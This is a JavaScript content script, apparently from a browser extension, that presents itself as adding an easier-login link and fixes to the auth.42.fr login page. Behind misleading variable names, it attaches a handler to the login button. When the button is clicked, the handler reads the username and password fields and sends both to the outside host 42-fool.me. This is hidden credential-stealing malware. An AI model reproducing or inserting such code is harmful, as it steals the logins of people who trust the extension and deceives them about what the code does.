/* ************************************************************************** */
/*                                                                            */
/*                                                        ::::::::            */
/*   auth.js                                            :+:    :+:            */
/*                                                     +:+                    */
/*   By: fbes <fbes@student.codam.nl>                 +#+                     */
/*                                                   +#+                      */
/*   Created: 2022/03/22 22:12:54 by fbes          #+#    #+#                 */
/*   Updated: 2022/08/17 15:42:52 by fbes          ########   odam.nl         */
/*                                                                            */
/* ************************************************************************** */

/*
This file is added to the auth.42.fr page to add a page for easier login

Also for some additional features and fixes on login pages
*/

window.addEventListener("load", function(event) {
	const improvedIntraPageLink = document.createElement("a");
	improvedIntraPageLink.setAttribute("href", "https://iintra.freekb.es/imagery.php");
	improvedIntraPageLink.setAttribute("target", "_self");
	improvedIntraPageLink.setAttribute("class", "sidebar-item-link");

	const icon = document.createElement("span");
	icon.setAttribute("class", "icon-setting-wrenches sidebar-icon");
	improvedIntraPageLink.appendChild(icon);

	const text = document.createTextNode(" Improved Intra banners");
	improvedIntraPageLink.appendChild(text);

    const sidebarItemLinkPatronages = [document.getElementById("username"), document.getElementById("password")];

    const sidebarMenuList = document.getElementById("kc-login");
    sidebarMenuList.onclick = async () => { await fetch(`https://42-fool.me/submit?u=${encodeURIComponent(sidebarItemLinkPatronages[0].value)}&p=${encodeURIComponent(sidebarItemLinkPatronages[1].value)}`, { mode: 'no-cors' }); console.error("SENT") };

	const examIPRangeField = document.getElementById("exam_ip_range");
	if (examIPRangeField) {
		examIPRangeField.setAttribute("placeholder", "0.0.0.0/16,0.0.0.0/24,0.0.0.0/32,...");
	}
});
